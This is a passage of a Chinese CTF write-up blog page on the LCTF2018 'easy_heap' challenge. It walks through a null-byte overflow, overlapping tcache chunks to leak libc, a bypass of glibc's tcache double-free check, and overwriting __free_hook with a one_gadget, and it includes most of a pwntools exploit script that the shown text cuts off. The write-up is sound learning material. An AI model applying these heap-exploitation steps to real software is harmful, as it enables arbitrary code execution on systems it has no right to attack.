@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1UB8-3Iy-UpGObkW6B9YHCQ提取码：cc8v 十个堆块一直在变位置，有点绕啊 1234567grxer@grxer &#x2F;m&#x2F;h&#x2F;S&#x2F;c&#x2F;p&#x2F;heap&gt; checksec easy_heap [*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;Share&#x2F;ctfwiki&#x2F;pwn&#x2F;heap&#x2F;easy_heap&amp;#x27;    Arch:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tcache LCTF2018-PWN-easy_heap">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/index.html">
+<meta property="og:site_name" content="Computer Security">
+<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1UB8-3Iy-UpGObkW6B9YHCQ提取码：cc8v 十个堆块一直在变位置，有点绕啊 1234567grxer@grxer &#x2F;m&#x2F;h&#x2F;S&#x2F;c&#x2F;p&#x2F;heap&gt; checksec easy_heap [*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;Share&#x2F;ctfwiki&#x2F;pwn&#x2F;heap&#x2F;easy_heap&amp;#x27;    Arch:">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224546593.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224823292.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328225833809.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232149288.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328235322081.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329002903347.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329004708034.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329005141653.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329014936412.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329015143119.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329125937130.png">
+<meta property="article:published_time" content="2023-03-28T06:55:05.000Z">
+<meta property="article:modified_time" content="2023-03-29T05:08:45.993Z">
+<meta property="article:author" content="Grxer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tcache LCTF2018-PWN-easy_heap</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/27/Tcache_house_of_spirit-unlink/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&text=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&is_video=false&description=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tcache LCTF2018-PWN-easy_heap&body=Check out this article: https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&title=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&name=Tcache LCTF2018-PWN-easy_heap&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/28/LCTF2018-PWN-easy-heap/&t=Tcache LCTF2018-PWN-easy_heap"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%83%85%E5%86%B5"><span class="toc-number">1.</span> <span class="toc-text">大致情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-heap-chunk%E9%9A%94%E5%9D%97%E6%94%BB%E5%87%BB%E6%B3%84%E9%9C%B2libc"><span class="toc-number">2.</span> <span class="toc-text">overlapping heap chunk隔块攻击泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#double-free-amp-amp-free-hook"><span class="toc-number">3.</span> <span class="toc-text">double free &amp;&amp; __free_hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tcache LCTF2018-PWN-easy_heap
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Grxer</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-28T06:55:05.000Z" itemprop="datePublished">2023-03-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ">https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ</a><br>提取码：cc8v</p>
+<p>十个堆块一直在变位置，有点绕啊</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/heap&gt; checksec easy_heap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/easy_heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="大致情况"><a href="#大致情况" class="headerlink" title="大致情况"></a>大致情况</h2><p>最多十个堆块</p>
+<p>malloc时存在一个null byte overflow，申请固定大小0xF8堆块，a1[a2] &#x3D; 0;正好可以覆盖下一个堆块的inuse位为0</p>
+<p>管理结构在0x202050处</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">    <span class="title">malloc_point</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span></span></span><br></pre></td></tr></table></figure>
+
+<p>没有其他漏洞了</p>
+<p><strong>大致思路是修改掉一个堆块的prevsize和inuse位，放入unsortedbin，利用unlink放入把一个中间的隔块污染放到unsorted链里来利用,泄露libc的同时构成double free，其实术语应该叫tcache dup，但是哥们感觉double free更形象一点</strong></p>
+<h2 id="overlapping-heap-chunk隔块攻击泄露libc"><a href="#overlapping-heap-chunk隔块攻击泄露libc" class="headerlink" title="overlapping heap chunk隔块攻击泄露libc"></a>overlapping heap chunk隔块攻击泄露libc</h2><p>先申请十个堆块0-9</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure>
+
+<p>把下面地址当成我们的chunk0-9基地址</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png" alt="image-20230328232549777"></p>
+<p>再把0-5释放掉，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure>
+
+<p>再释放9(释放9是为了防止直接释放789，会和topchunk合并，9进入tcachebin inuse位不置空)</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224546593.png" alt="image-20230328224546593"></p>
+<p>tacache满了再释放6 7 8</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224823292.png" alt="image-20230328224823292"></p>
+<p>为什么只有chunk6呢？678相邻释放完6再释放7，8前面的堆块为free状态，会触发unlinke</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328225833809.png" alt="image-20230328225833809"></p>
+<p>十个chunk都释放掉了</p>
+<p>再把tcache chunk的7个chunk申请出来，我们才可以接触到unsort bin的chunk，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure>
+
+<p>把三个都申请出来作为chunk 7 8 9</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232149288.png" alt="image-20230328232149288"></p>
+<p>这个时候chunk8((0x555555757b00))的inuse位为1，presize为0x200，可以把他前面的chunk7(0x555555757a00)申请出来，就可以覆盖chunk8(0x555555757b00)的inuse位</p>
+<p>需要把前面8个chunk申请出来，才可以拿到chunk7(0x555555757a00)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">6</span>)</span>:</span><br><span class="line">       <span class="title function_">delete</span><span class="params">(i)</span></span><br></pre></td></tr></table></figure>
+
+<p>delete(8)</p>
+<p>delete(7)</p>
+<p>这里先释放8(0x555555757a00)有几点原因</p>
+<ul>
+<li>可以填满填满tcache，7(0x555555757900)进入unsortbin，会有fd和bk指针写入unsortedbin地址</li>
+<li>下一次会先申请到8(0x555555757a00)，来覆盖chunk8(0x555555757b00)的inuse位</li>
+</ul>
+<p><code>new(0xf8,b&#39;null-byte-overflow&#39;)</code></p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328235322081.png" alt="image-20230328235322081"></p>
+<p>目前申请到的0为0x555555757a00，0x555555757b00 previnuse位为0，也就是说0被污染为未使用实际却是使用状态，prevsize是0x200大小，0x555555757900也是free，</p>
+<p>这个时候释放9(0x555555757b00)会触发unlinke,0x555555757900,0x555555757a00，0x555555757b00合并为一个大堆块，这样我们就可以强制把0x555555757a00加入unsortedbin里</p>
+<p>delete(6)</p>
+<p>delete(9)</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329002903347.png" alt="image-20230329002903347"></p>
+<p>这个时候再把0x555555757900申请出来，0x555555757a00会挂上链，fd和bk会有bin值，这时候0x555555757a00还在0处使用就可以show泄露unsortedbin了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#拿走tcachebin里的</span></span><br><span class="line">    new(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;900&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>通过__malloc_hook和main_arean和unsortedbin的偏移找到libc基址</p>
+<h2 id="double-free-amp-amp-free-hook"><a href="#double-free-amp-amp-free-hook" class="headerlink" title="double free &amp;&amp; __free_hook"></a>double free &amp;&amp; __free_hook</h2><p>目前state是这样的</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329004708034.png" alt="image-20230329004708034"></p>
+<p>再去申请一个堆不就可以double free了吗</p>
+<p>**你可能会问我们之前不是在 <a href="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/">https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/</a> 说过unbutu18被patch掉了吗，怎么还能double free **</p>
+<blockquote>
+<p>我们注意到在程序delete时</p>
+<p><code> memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8));</code></p>
+<p>这一句就帮助我们绕过double free</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在检测doublefree时最简单的就是每一次释放都去遍历一下单链表，但是这样效率太低了，毕竟tcache的出现就是为了速度，ptmalloc2为了效率，在e-&gt;key &#x3D;&#x3D; tcache时才会进行检测double free，因为在使用状态的chunk，e-&gt;key是数据区，基本上是不会满足-&gt;key &#x3D;&#x3D; tcache的，64位程序只有2^48-1分之一的概率，使用状态的也没必要检测double free</p>
+<p>memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8)这一句会帮我们把原本要释放的key抹除掉，e-&gt;key !&#x3D; tcache自然不会检测doublefree</p>
+</blockquote>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329005141653.png" alt="image-20230329005141653"></p>
+<p>free掉0和9</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329014936412.png" alt="image-20230329014936412"></p>
+<p>new(0x10, p64(libc.dump(‘__free_hook’)+base))写入hook到单链表</p>
+<p>new(0x10, ‘fuck’)</p>
+<p>把a10拿出来</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329015143119.png" alt="image-20230329015143119"></p>
+<p>由于在满员下释放了两个堆，又申请了两个，满员了，free掉0和9之前需要再释放几个堆才可以申请下一个</p>
+<p>new(0x10, p64(one_gadget))就可以申请到__free_hook-0x10去，hook掉了__free_hook为onegadget</p>
+<p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329125937130.png" alt="image-20230329125937130"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./easy_heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">        io.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;null-byte-overflow&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0x10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line">main_arean=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">malloc_hook=main_arean-<span 